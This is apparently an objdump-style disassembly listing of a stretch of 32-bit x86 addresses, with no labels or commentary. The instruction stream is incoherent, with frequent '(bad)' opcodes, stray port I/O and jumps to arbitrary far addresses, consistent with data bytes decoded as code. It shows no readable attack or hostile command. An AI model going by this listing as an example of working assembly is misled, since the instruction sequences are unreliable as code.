  42e58e:	in     eax,dx
  42e58f:	in     eax,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	sahf   
  42e601:	cdq    
  42e602:	lods   eax,DWORD PTR ds:[esi]
  42e603:	inc    BYTE PTR [eax+esi*8+0x1]
  42e607:	add    BYTE PTR [ecx+eax*1],al
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	pop    es
  42e60d:	cmp    eax,0xa3a81371
  42e612:	xchg   BYTE PTR [edx-0x4d632c70],ch
  42e618:	adc    cl,BYTE PTR [eax+0x55]
  42e61b:	cdq    
  42e61c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e61d:	sub    ebx,DWORD PTR [edx-0x52]
  42e620:	dec    esi
  42e621:	div    BYTE PTR [edx-0x70a51896]
  42e627:	(bad)  
  42e629:	aad    0xa
  42e62b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e62c:	mov    al,0xbc
  42e62e:	ins    DWORD PTR es:[edi],dx
  42e62f:	dec    edx
  42e630:	xchg   edx,eax
  42e631:	or     ah,ch
  42e633:	adc    ebx,DWORD PTR [edx]
  42e635:	ja     0x42e5c4
  42e637:	ret    0xd2e
  42e63a:	clc    
  42e63b:	hlt    
  42e63c:	jnp    0x42e5f7
  42e63e:	js     0x42e5c0
  42e640:	(bad)  
  42e641:	push   ebx
  42e642:	push   eax
  42e643:	int3   
  42e644:	sbb    eax,0x855fc170
  42e649:	jge    0x42e648
  42e64b:	loope  0x42e64f
  42e64d:	xor    DWORD PTR [eax+esi*4-0x1a],esi
  42e651:	sbb    ch,BYTE PTR [eax+eax*8]
  42e654:	dec    edx
  42e655:	lods   eax,DWORD PTR ds:[esi]
  42e656:	pop    esi
  42e657:	icebp  
  42e658:	std    
  42e659:	jge    0x42e60a
  42e65b:	jae    0x42e6cf
  42e65d:	jns    0x42e68b
  42e65f:	mov    esp,0xa14f72a9
  42e664:	inc    esp
  42e665:	push   0x4a0a5e51
  42e66a:	test   al,0x9e
  42e66c:	out    0x8f,al
  42e66e:	popa   
  42e66f:	sbb    bl,dl
  42e671:	pop    es
  42e672:	fimul  DWORD PTR [esi-0x48]
  42e675:	and    dh,BYTE PTR [edx]
  42e677:	retfw  0xf702
  42e67b:	cli    
  42e67c:	adc    al,0xab
  42e67e:	aam    0xff
  42e680:	sub    eax,0x17d8991e
  42e685:	test   al,0x71
  42e687:	jecxz  0x42e6be
  42e689:	pop    esi
  42e68a:	jmp    0xeed5fc44
  42e68f:	add    eax,0xf6903cee
  42e694:	fidivr WORD PTR ss:[ebx+esi*2-0x7b]
  42e699:	int    0x48
  42e69b:	jle    0x42e6ac
  42e69d:	(bad)  
  42e69e:	outs   dx,BYTE PTR ds:[esi]
  42e69f:	mov    BYTE PTR [esi-0x30fc5b93],ah
  42e6a5:	mov    ecx,0x63b18c21
  42e6aa:	dec    ebx
  42e6ab:	mov    al,0x16
  42e6ad:	mov    ah,0x24
  42e6af:	push   eax
  42e6b0:	mov    ds:0x18a7321f,eax
  42e6b5:	pop    edi
  42e6b6:	mov    cl,0x71
  42e6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6b9:	(bad)  
  42e6ba:	inc    esi
  42e6bb:	jmp    0x8e32:0x5f23de04
  42e6c2:	sub    al,0x3b
  42e6c4:	cmp    DWORD PTR [edi-0x5a],edi
  42e6c7:	(bad)
  42e6cb:	(bad)  
  42e6cc:	dec    esp
  42e6cd:	call   0x2374e9b1
  42e6d2:	out    dx,eax
  42e6d3:	adc    BYTE PTR [eax+0x4a],ah
  42e6d6:	loopne 0x42e66e
  42e6d8:	mov    esp,0xd1eba8a6
  42e6dd:	into   
  42e6de:	in     al,0x28
  42e6e0:	stos   DWORD PTR es:[edi],eax
  42e6e1:	fs inc ebp
  42e6e3:	outs   dx,DWORD PTR ds:[esi]
  42e6e4:	pop    ecx
  42e6e5:	inc    ecx
  42e6e6:	sbb    eax,0xf2041a9b
  42e6eb:	cmp    eax,0x441a5faf
  42e6f0:	inc    esi
  42e6f1:	adc    esi,esp
  42e6f3:	pop    es
  42e6f4:	jge    0x42e677
  42e6f6:	aad    0x82
  42e6f8:	repnz call 0x8e10:0xfe0a483
  42e700:	rcr    bh,cl
  42e702:	imul   edi,DWORD PTR [esi+0x22dfc232],0xebebe84e
  42e70c:	jp     0x42e6ac
  42e70e:	(bad)  [edx+0x0]
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovbe st,st(6)
  42e781:	mov    fs,WORD PTR [ebx]
  42e783:	cwde   
  42e784:	dec    eax
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	aam    0x64
  42e78e:	mov    bh,0xb1
  42e790:	out    0x45,eax
  42e792:	mov    ebp,0xa7077ce7
  42e797:	push   0x17
  42e799:	ficom  WORD PTR [esi-0x685d8d82]
  42e79f:	and    al,0x71
  42e7a1:	loopne 0x42e757
  42e7a3:	cdq    
  42e7a4:	test   al,0x1c
  42e7a6:	inc    edx
  42e7a7:	sti    
  42e7a8:	dec    edx
  42e7a9:	jmp    0xc66d:0xac3e7a88
  42e7b0:	pop    edx
  42e7b1:	in     eax,dx
  42e7b2:	xchg   ecx,eax
  42e7b3:	stc    
  42e7b4:	sbb    ch,BYTE PTR [esp+ebp*8]
  42e7b7:	cmp    bl,0xfd
  42e7ba:	add    al,BYTE PTR [eax]
  42e7bc:	loope  0x42e75c
  42e7be:	int    0x28
  42e7c0:	(bad)  
  42e7c1:	nop
  42e7c2:	adc    cl,BYTE PTR [ebx-0x7472b3ca]
  42e7c8:	xchg   esi,eax
  42e7c9:	cmp    eax,0x41907993
  42e7ce:	nop
  42e7cf:	add    al,0xb8
  42e7d1:	rcr    BYTE PTR [ebx],0x84
  42e7d4:	mov    cs,eax
  42e7d6:	test   al,0x9f
  42e7d8:	js     0x42e796
  42e7da:	ins    DWORD PTR es:[edi],dx
  42e7db:	push   0xffffffd5
  42e7dd:	cmp    BYTE PTR [edx],ah
  42e7df:	loopne 0x42e7c1
  42e7e1:	mov    ecx,0x9dbb2846
  42e7e6:	push   ecx
  42e7e7:	int3   
  42e7e8:	lods   al,BYTE PTR ds:[esi]
  42e7e9:	lock pop es
  42e7eb:	(bad)  
  42e7ec:	pop    ecx
  42e7ed:	push   0x106eb922
  42e7f2:	and    DWORD PTR [eax],edx
  42e7f4:	fistp  WORD PTR [edi]
  42e7f6:	repz xor bh,BYTE PTR [edx-0x40]
  42e7fa:	jns    0x42e796
  42e7fc:	sub    ebp,DWORD PTR [esi]
  42e7fe:	push   ds
  42e7ff:	call   DWORD PTR [ebp-0x250217c8]
  42e805:	dec    ah
  42e807:	xor    ah,bl
  42e809:	test   DWORD PTR ds:0x1981e958,esp
  42e80f:	lods   eax,DWORD PTR ds:[esi]
  42e810:	gs aam 0x4c
  42e813:	dec    BYTE PTR [ecx-0x354e423d]
  42e819:	pop    ecx
  42e81a:	jecxz  0x42e85c
  42e81c:	push   0x9fd789d1
  42e821:	clc    
  42e822:	lock pop ss
  42e824:	sbb    dh,BYTE PTR [ebx+0x5b]
  42e827:	fild   WORD PTR [edx]
  42e829:	fwait
  42e82a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e82b:	in     eax,dx
  42e82c:	mov    ds:0x7c2efbc2,eax
  42e831:	push   0xfffffff3
  42e833:	xor    al,0x17
  42e835:	jmp    0xa8944248
  42e83a:	test   BYTE PTR [edi-0x4b],bl
  42e83d:	sti    
  42e83e:	lock cmc 
  42e840:	and    al,bh
  42e842:	jp     0x42e872
  42e844:	(bad)  
  42e845:	jg     0x42e882
  42e847:	jge    0x42e89b
  42e849:	push   ecx
  42e84a:	pop    eax
  42e84b:	pop    es
  42e84c:	add    cl,al
  42e84e:	out    0x57,al
  42e850:	jb     0x42e86d
  42e852:	popf   
  42e853:	mov    ebx,0x85e1568b
  42e858:	iret   
  42e859:	pop    ecx
  42e85a:	dec    edx
  42e85b:	mov    ecx,0x6275549d
  42e860:	mov    ebp,fs
  42e862:	stos   DWORD PTR es:[edi],eax
  42e863:	jecxz  0x42e84b
  42e865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e866:	pop    esi
  42e867:	xchg   BYTE PTR [edx+0x169b49e6],bh
  42e86d:	idiv   BYTE PTR [ecx]
  42e86f:	sahf   
  42e870:	fmul   QWORD PTR [edx-0x13]
  42e873:	push   0x5a
  42e875:	add    al,0x17
  42e877:	jmp    0xf7ddc8bc
  42e87c:	adc    DWORD PTR [ebp+0x4ed29f61],esp
  42e882:	cmp    eax,DWORD PTR [edx]
  42e884:	or     al,0x82
  42e886:	add    DWORD PTR [ecx-0x3a],edx
  42e889:	out    dx,al
  42e88a:	imul   eax,esi,0xffffffba
  42e88d:	or     ah,cl
  42e88f:	dec    esp
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x3523f82b]
  42e901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e902:	pop    es
  42e903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	les    esp,FWORD PTR [esi-0x48ea1e55]
  42e912:	sub    DWORD PTR [ebp-0x5c5991c],ebp
  42e918:	lods   eax,DWORD PTR ds:[esi]
  42e919:	pop    ss
  42e91a:	add    BYTE PTR [ebx],ch
  42e91c:	fmul   st,st(4)
  42e91e:	and    DWORD PTR [eax-0x2627b381],0xffffffae
  42e925:	into   
  42e926:	jbe    0x42e92d
  42e928:	in     eax,0x13
  42e92a:	xchg   edx,eax
  42e92b:	(bad)  
  42e92d:	rcr    DWORD PTR [edi+0x64],0xd7
  42e931:	xchg   esp,eax
  42e932:	xchg   DWORD PTR [ecx],esi
  42e934:	pop    esi
  42e935:	xor    ebp,0xffffffb7
  42e938:	jmp    0xc721d214
  42e93d:	stos   BYTE PTR es:[edi],al
  42e93e:	stos   BYTE PTR es:[edi],al
  42e93f:	cli    
  42e940:	push   cs
  42e941:	das    
  42e942:	scas   eax,DWORD PTR es:[edi]
  42e943:	popf   
  42e944:	add    bh,BYTE PTR [esi-0x6e]
  42e947:	ficomp WORD PTR [ecx+0x47]
  42e94a:	push   ebp
  42e94b:	cmp    BYTE PTR ss:[ebx],bl
  42e94e:	test   BYTE PTR [ebp-0x563ff1f4],cl
  42e954:	shr    BYTE PTR [edx+ebp*1+0x6e41a51b],1
  42e95b:	lock lock mov al,0x59
  42e95f:	add    DWORD PTR [esi-0x6],0xffffffd3
  42e963:	xor    DWORD PTR [ebx+edx*1],ebp
  42e966:	stos   BYTE PTR es:[edi],al
  42e967:	lods   eax,DWORD PTR ds:[esi]
  42e968:	push   0x53dd709c
  42e96d:	rol    DWORD PTR [eax-0x7b035586],0xe0
  42e974:	sbb    BYTE PTR [ebp-0x3a],dh
  42e977:	cs ins BYTE PTR es:[edi],dx
  42e979:	push   ebx
  42e97a:	nop
  42e97b:	aam    0xdd
  42e97d:	add    al,0x86
  42e97f:	dec    edx
  42e980:	sub    ecx,edx
  42e982:	sahf   
  42e983:	and    esp,eax
  42e985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e986:	stc    
  42e987:	and    dh,BYTE PTR [ebp+0x14]
  42e98a:	arpl   WORD PTR ds:0xb09ac3f7,di
  42e990:	add    BYTE PTR [ecx],ch
  42e992:	scas   eax,DWORD PTR es:[edi]
  42e993:	rcl    BYTE PTR ds:0xa508,0x65
  42e999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e99a:	dec    ebx
  42e99b:	xchg   ecx,eax
  42e99c:	fsub   DWORD PTR [esi-0x2f]
  42e99f:	jbe    0x42e9e3
  42e9a1:	out    dx,al
  42e9a2:	add    eax,0x13bb5325
  42e9a7:	jmp    0x7b8d:0xd3a23587
  42e9ae:	std    
  42e9af:	int3   
  42e9b0:	mov    ah,0x2d
  42e9b2:	add    al,0x27
  42e9b4:	rcr    esp,1
  42e9b6:	adc    BYTE PTR [ebx],cl
  42e9b8:	ins    BYTE PTR es:[edi],dx
  42e9b9:	push   ecx
  42e9ba:	push   edi
  42e9bb:	nop
  42e9bc:	and    DWORD PTR [eax-0x106b1db4],edx
  42e9c2:	cli    
  42e9c3:	bound  ebp,QWORD PTR [ecx]
  42e9c5:	push   0xffffffe1
  42e9c7:	enter  0xb172,0xcd
  42e9cb:	test   bh,al
  42e9cd:	repz dec esi
  42e9cf:	add    DWORD PTR [edi],ecx
  42e9d1:	mov    ebp,0xfeb2351a
  42e9d6:	xor    al,0xf0
  42e9d8:	xchg   esp,eax
  42e9d9:	mov    edx,0xa381e665
  42e9de:	je     0x42e981
  42e9e0:	loope  0x42e9a7
  42e9e2:	mov    ds:0x3f3a00bc,eax
  42e9e7:	outs   dx,DWORD PTR ds:[esi]
  42e9e8:	jno    0x42e9a4
  42e9ea:	adc    al,ah
  42e9ec:	sub    DWORD PTR [edx],esi
  42e9ee:	mov    esi,0x81bfb8c
  42e9f3:	test   BYTE PTR [ebx],ch
  42e9f5:	and    eax,0x2232e8d6
  42e9fa:	repnz sbb eax,esi
  42e9fd:	call   FWORD PTR [ebp-0x42ed1e4e]
  42ea03:	nop
  42ea04:	jmp    0x42e991
  42ea06:	gs mov dl,0x33
  42ea09:	sbb    eax,0x2dc112b9
  42ea0e:	fmul   QWORD PTR [edi+0x0]
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	shl    DWORD PTR [eax-0xcaf20b1],cl
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	jmp    0xb9d7191b
  42ea91:	push   cs
  42ea92:	inc    DWORD PTR [edi-0xf2843]
  42ea98:	mov    esi,0xd3463457
  42ea9d:	jp     0x42ea7b
  42ea9f:	add    al,0x7f
  42eaa1:	and    BYTE PTR [eax-0xe],bh
  42eaa4:	aas    
  42eaa5:	cmp    DWORD PTR [edi+0x1],ebx
  42eaa8:	inc    esp
  42eaa9:	fistp  QWORD PTR [ebp-0x262c6020]
  42eaaf:	mov    ss,ebp
  42eab1:	std    
  42eab2:	fbstp  TBYTE PTR [edi+0x7b]
  42eab5:	push   ecx
  42eab6:	nop
  42eab7:	mov    eax,ds:0x3b31ec87
  42eabc:	call   0xdce575d4
  42eac1:	mov    cs,WORD PTR [ebx]
  42eac3:	repnz aam 0x11
  42eac6:	stos   DWORD PTR es:[edi],eax
  42eac7:	stos   DWORD PTR es:[edi],eax
  42eac8:	imul   ecx,DWORD PTR [esi+0x24],0x1b
  42eacc:	in     al,dx
  42eacd:	sbb    BYTE PTR [edx+0x4174d4e3],0x6e
  42ead4:	pop    esp
  42ead5:	mov    gs,WORD PTR [edi]
  42ead7:	loopne 0x42ea89
  42ead9:	jg     0x42eb28
  42eadb:	or     cl,ch
  42eadd:	mov    BYTE PTR [ebp+edi*1-0x40a10705],al
  42eae4:	shl    DWORD PTR ds:0x7e79c9ad,0xf1
  42eaeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eaec:	bound  ebx,QWORD PTR [esi]
  42eaee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eaef:	mov    gs,esp
  42eaf1:	cmp    ah,BYTE PTR [edx]
  42eaf3:	mov    dl,0x19
  42eaf5:	test   ebx,0xc73f9239
  42eafb:	retf   
  42eafc:	sbb    ebx,edi
  42eafe:	data16 (bad) 
  42eb00:	cli    
  42eb01:	ins    DWORD PTR es:[edi],dx
  42eb02:	mov    edi,0x37316c4d
  42eb07:	retfw  0x60d1
  42eb0b:	xchg   ecx,eax
  42eb0c:	jecxz  0x42eb51
  42eb0e:	pusha  
  42eb0f:	pop    esi
  42eb10:	jne    0x42eabb
  42eb12:	cdq    
  42eb13:	in     al,dx
  42eb14:	inc    edx
  42eb15:	mov    ch,0x2a
  42eb17:	cmc    
  42eb18:	xor    al,0xa5
  42eb1a:	scas   al,BYTE PTR es:[edi]
  42eb1b:	xchg   DWORD PTR [ebx+ecx*4],eax
  42eb1e:	inc    BYTE PTR [edx+eiz*4]
  42eb21:	push   ds
  42eb22:	rcr    DWORD PTR [ebx+eax*1+0x1fe48372],0x23
  42eb2a:	cmp    dh,BYTE PTR ds:0xa8e54232
  42eb30:	jnp    0x42eb05
  42eb32:	push   esp
  42eb33:	push   eax
  42eb34:	es jbe 0x42eac2
  42eb37:	cli    
  42eb38:	add    bl,BYTE PTR [eax+ebp*8+0x4e893b4a]
  42eb3f:	jae    0x42eb54
  42eb41:	mov    ah,0xf3
  42eb43:	add    bl,BYTE PTR [ebx-0x6f9f0105]
  42eb49:	(bad)  
  42eb4b:	inc    esi
  42eb4c:	or     BYTE PTR [esi],ch
  42eb4e:	or     al,ch
  42eb50:	dec    ebx
  42eb51:	pusha  
  42eb52:	jne    0x42eb7e
  42eb54:	inc    edi
  42eb55:	mov    bl,0x27
  42eb57:	xchg   ebx,eax
  42eb58:	mov    BYTE PTR [edi+0x36f85bb],ah
  42eb5e:	push   esi
  42eb5f:	xchg   edx,eax
  42eb60:	jmp    DWORD PTR [ecx]
  42eb62:	jns    0x42ebce
  42eb64:	adc    eax,0xd2b42dfa
  42eb69:	out    0x76,al
  42eb6b:	es and bl,ah
  42eb6e:	cmp    al,0xc8
  42eb70:	dec    eax
  42eb71:	in     eax,0x6c
  42eb73:	xchg   esi,eax
  42eb74:	push   ecx
  42eb75:	clc    
  42eb76:	and    ecx,0x3051e92c
  42eb7c:	dec    esi
  42eb7d:	dec    ecx
  42eb7e:	add    BYTE PTR [edi+0x29],dh
  42eb81:	cmp    ah,BYTE PTR gs:[ebx+0x30e4f36c]
  42eb88:	(bad)  
  42eb89:	repz mov bl,0xd
  42eb8c:	inc    ebp
  42eb8d:	dec    ebp
  42eb8e:	repz rol BYTE PTR [eax],0x0
	...
  42ebf2:	add    BYTE PTR [eax],al
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	or     DWORD PTR [ebx+0x54b454ec],0x40001f4
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [esi-0x6f9631ae],al
  42ec11:	(bad)  
  42ec12:	and    DWORD PTR [edx+eiz*2-0x42],edx
  42ec16:	jp     0x42ec85
  42ec18:	iret   
  42ec19:	pop    ebp
  42ec1a:	and    esi,ebp
  42ec1c:	nop
  42ec1d:	adc    edi,DWORD PTR [edi+0x59]
  42ec20:	mov    esp,0x108e5846
  42ec25:	inc    ecx
  42ec26:	pop    ebx
  42ec27:	and    DWORD PTR [ebx-0x10b3c42f],edi
  42ec2d:	ds popf 
  42ec2f:	std    
  42ec30:	pop    eax
  42ec31:	imul   BYTE PTR [ebp-0x519645e1]
  42ec37:	xor    al,BYTE PTR [ebp-0x5c]
  42ec3a:	ret    0xe3cb
  42ec3d:	xchg   ebp,eax
  42ec3e:	iret   
  42ec3f:	jl     0x42ebed
  42ec41:	ins    DWORD PTR es:[edi],dx
  42ec42:	fld    DWORD PTR [edi+0x44]
  42ec45:	add    BYTE PTR [edi-0x2a],0x5d
  42ec49:	pop    edi
  42ec4a:	and    DWORD PTR [edx],edi
  42ec4c:	xlat   BYTE PTR ds:[ebx]
  42ec4d:	jmp    0x42ec3c
  42ec4f:	(bad)  
  42ec51:	shl    DWORD PTR [eax+0x3c],1
  42ec54:	nop
  42ec55:	call   0xc176:0x9b713680
  42ec5c:	mov    al,ds:0x37bc09a9
  42ec61:	sar    ch,cl
  42ec63:	shr    BYTE PTR [ecx+0x76],1
  42ec66:	cmp    DWORD PTR [ebp-0x2a],edi
  42ec69:	mov    edx,DWORD PTR [edi+0x75eb8113]
  42ec6f:	jl     0x42ec16
  42ec71:	call   0xc70c:0x622cba8c
  42ec78:	cdq    
  42ec79:	test   eax,0x4541d156
  42ec7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec7f:	cdq    
  42ec80:	(bad)  
  42ec81:	mov    ebp,0xde4869c4
  42ec86:	call   0xa14afa78
  42ec8b:	xor    esi,ecx
  42ec8d:	gs sbb eax,0xa8b08081
  42ec93:	frstor [esi]
  42ec95:	call   0x1e5d:0xa4b965ef
  42ec9c:	jmp    0x42ec96
  42ec9e:	and    al,0x41
  42eca0:	icebp  
  42eca1:	fwait
  42eca2:	push   ss
  42eca3:	scas   al,BYTE PTR es:[edi]
  42eca4:	test   edx,ebp
  42eca6:	push   edx
  42eca7:	pop    gs
  42eca9:	mov    cl,0x33
  42ecab:	fs ret 
  42ecad:	and    BYTE PTR [edi+0x53],dh
  42ecb0:	mov    ebp,0xbcc8ccc1
  42ecb5:	fiadd  DWORD PTR [eax]
  42ecb7:	add    eax,0xaa3d4fab
  42ecbc:	jnp    0x42ecd6
  42ecbe:	out    dx,al
  42ecbf:	or     edi,DWORD PTR [ebx-0x6f22cddf]
  42ecc5:	int3   
  42ecc6:	rcr    esi,1
  42ecc8:	imul   esi,esp,0x4f83e75f
  42ecce:	jle    0x42ecbc
  42ecd0:	sbb    BYTE PTR [ebp+0x8],0xe3
  42ecd4:	cwde   
  42ecd5:	pop    esi
  42ecd6:	sub    BYTE PTR [ebp-0x73],bh
  42ecd9:	jmp    0x42ed48
  42ecdb:	popa   
  42ecdc:	pop    esi
  42ecdd:	mov    ah,0xe
  42ecdf:	and    BYTE PTR [edi],al
  42ece1:	imul   ecx,DWORD PTR [eax+0x22],0xa6cef75f
  42ece8:	jmp    0x886f2633
  42eced:	popf   
  42ecee:	stos   DWORD PTR es:[edi],eax
  42ecef:	daa    
  42ecf0:	xlat   BYTE PTR ds:[ebx]
  42ecf1:	mov    BYTE PTR [edi+0x2d],dl
  42ecf4:	dec    eax
  42ecf5:	in     eax,dx
  42ecf6:	scas   eax,DWORD PTR es:[edi]
  42ecf7:	jle    0x42ecdc
  42ecf9:	retf   
  42ecfa:	aaa    
  42ecfb:	pushf  
  42ecfc:	mov    BYTE PTR ds:0xee8badf4,ch
  42ed02:	and    eax,0x182cef94
  42ed07:	inc    edx
  42ed08:	cmp    eax,0xd21db00a
  42ed0d:	ds cwde 
  42ed0f:	jnp    0x42ed11
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x7392fa5e]
  42ed83:	cmp    bl,BYTE PTR [eax-0xb]
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	ja     0x42ed21
  42ed8e:	fsub   st,st(2)
  42ed90:	pushf  
  42ed91:	xor    al,0xef
  42ed93:	loopne 0x42edb9
  42ed95:	loopne 0x42ed79
  42ed97:	jecxz  0x42eddf
  42ed99:	sub    eax,0xde22574a
  42ed9e:	sti    
  42ed9f:	mov    ds:0xe5969fb7,eax
  42eda4:	outs   dx,DWORD PTR ds:[esi]
  42eda5:	aas    
  42eda6:	xchg   esp,eax
  42eda7:	push   eax
  42eda8:	cdq    
  42eda9:	sbb    cl,BYTE PTR [ebx+0x2fc8b3a3]
  42edaf:	mov    ebp,0xae4b393d
  42edb4:	clc    
  42edb5:	add    al,0x16
  42edb7:	jns    0x42ee21
  42edb9:	sbb    al,0x85
  42edbb:	mov    DWORD PTR [ebp+0xf71cbe8],edi
  42edc1:	pushf  
  42edc2:	add    dl,BYTE PTR [eax+0x572390d7]
  42edc8:	push   ebp
  42edc9:	int3   
  42edca:	ins    BYTE PTR es:[edi],dx
  42edcb:	(bad)  
  42edcd:	mov    ebx,0x2318cb8
  42edd2:	or     eax,0x907789c5
  42edd7:	ins    BYTE PTR es:[edi],dx
  42edd8:	jge    0x42edf0
  42edda:	int3   
  42eddb:	adc    al,0x48
  42eddd:	test   DWORD PTR [esp+eax*1+0x5e],ecx
  42ede1:	jbe    0x42ee03
  42ede3:	mov    eax,DWORD PTR [esi+edx*8+0x7809cc2d]
  42edea:	and    DWORD PTR [ebp+0x2b],edi
  42eded:	call   0xac9f:0xaed96afe
  42edf4:	jp     0x42ee5b
  42edf6:	xor    BYTE PTR [edi],0xe7
  42edf9:	loop   0x42ed83
  42edfb:	mov    ecx,DWORD PTR [eax]
  42edfd:	(bad)  
  42edfe:	fldcw  WORD PTR [eax]
  42ee00:	xchg   ecx,eax
  42ee01:	jno    0x42ee03
  42ee03:	into   
  42ee04:	mov    dl,0xbf
  42ee06:	inc    ebp
  42ee07:	fisubr WORD PTR [esi-0x7f6f1c21]
  42ee0d:	inc    esp
  42ee0e:	gs xchg ecx,eax
  42ee10:	jb     0x42edb0
  42ee12:	dec    ebp
  42ee13:	cmp    al,0x9c
  42ee15:	cmp    al,dh
  42ee17:	add    dh,BYTE PTR [eax-0xb]
  42ee1a:	xchg   ebp,eax
  42ee1b:	pop    ebx
  42ee1c:	jmp    0xa939:0x5021a618
  42ee23:	inc    ebx
  42ee24:	mov    BYTE PTR [ecx+ebp*2+0x44],al
  42ee28:	data16 cmp BYTE PTR [bp-0x1b24],0xad
  42ee2f:	and    dh,BYTE PTR [ecx+0x2ce67a38]
  42ee35:	(bad)  
  42ee36:	cmc    
  42ee37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee38:	repz pop ebp
  42ee3a:	dec    edx
  42ee3b:	sbb    DWORD PTR [ebx-0x3b],0x85861b09
  42ee42:	out    0x7,eax
  42ee44:	test   eax,0x36b9f4cf
  42ee49:	imul   eax,DWORD PTR [ebp+0x15],0xffffffa9
  42ee4d:	(bad)  
  42ee4e:	jno    0x42ede0
  42ee50:	or     eax,0xa6c69b21
  42ee55:	gs push ebp
  42ee57:	aas    
  42ee58:	adc    al,0xdd
  42ee5a:	ja     0x42ee3f
  42ee5c:	rol    BYTE PTR ds:0x428daaad,cl
  42ee62:	pop    ebx
  42ee63:	fmul   DWORD PTR [edx-0x62]
  42ee66:	dec    esp
  42ee67:	mov    edi,0x28318917
  42ee6c:	loop   0x42edf3
  42ee6e:	cmp    eax,0x6453182d
  42ee73:	out    0x77,eax
  42ee75:	call   0x1235:0x3dfb7e69
  42ee7c:	push   esp
  42ee7d:	loope  0x42ee61
  42ee7f:	vandnps ymm0,ymm1,YMMWORD PTR [edx-0x42]
  42ee84:	std    
  42ee85:	cld    
  42ee86:	pushf  
  42ee87:	sar    DWORD PTR [edi-0x73],1
  42ee8a:	arpl   WORD PTR [esi],si
  42ee8c:	in     eax,0x40
  42ee8e:	int3   
  42ee8f:	add    BYTE PTR [bx+si],al
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	loopne 0x42eeb0
  42ef02:	ds aad 0x5c
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	xor    eax,0xa1ffff58
  42ef11:	mov    al,0x47
  42ef13:	xor    al,0x60
  42ef15:	jnp    0x42ef75
  42ef17:	push   eax
  42ef18:	inc    edx
  42ef19:	(bad)  
  42ef1a:	cmp    DWORD PTR ds:[ecx-0x60d96a36],ebx
  42ef21:	or     DWORD PTR [edi],esi
  42ef23:	or     BYTE PTR [edx-0x753b871],0x9e
  42ef2a:	pop    edx
  42ef2b:	xchg   esi,eax
  42ef2c:	pop    eax
  42ef2d:	pop    edi
  42ef2e:	cdq    
  42ef2f:	clc    
  42ef30:	xchg   edx,eax
  42ef31:	nop
  42ef32:	push   edx
  42ef33:	or     eax,0xb3c5bfd2
  42ef38:	sub    al,0x98
  42ef3a:	daa    
  42ef3b:	(bad)  
  42ef3c:	adc    dh,cl
  42ef3e:	sub    ebx,DWORD PTR [ebp+0x1d4fd133]
  42ef44:	xchg   dl,ch
  42ef46:	mov    ds:0xeeabad13,al
  42ef4b:	lahf   
  42ef4c:	sbb    ch,BYTE PTR [ebp-0x4e]
  42ef4f:	fs clc 
  42ef51:	fmul   QWORD PTR [edi+0x59d24cb8]
  42ef57:	call   DWORD PTR [di+0x1b45]
  42ef5c:	das    
  42ef5d:	dec    esp
  42ef5e:	mov    ecx,0xa41b0380
  42ef63:	jecxz  0x42ef44
  42ef65:	outs   dx,BYTE PTR ds:[esi]
  42ef66:	sbb    al,0x95
  42ef69:	leave  
  42ef6a:	xchg   ecx,eax
  42ef6b:	lock xlat BYTE PTR ds:[ebx]
  42ef6d:	inc    esp
  42ef6e:	sbb    ah,dl
  42ef70:	push   ecx
  42ef71:	xor    al,0x45
  42ef73:	shl    DWORD PTR [ebx],1
  42ef75:	and    eax,0xad1bbbf3
